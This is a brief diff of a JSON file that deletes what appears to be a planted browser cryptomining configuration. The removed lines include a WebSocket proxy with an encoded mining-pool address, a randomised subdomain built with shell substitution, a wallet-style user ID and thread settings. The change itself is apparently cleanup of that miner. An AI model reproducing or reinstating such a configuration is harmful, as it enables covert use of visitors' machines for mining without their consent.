@@ -1,5 +1,3 @@
 {
-  "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:9999/ZXUtc3RyYXR1bS5ibG9ja21pbmVyei5jb206MzUwNQ==",
-  "config": { "threads": 6, "log": true },
-  "options": { "user": "MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93", "password": "x", "argent": "web-wasm/1.0" }
+ 
 }
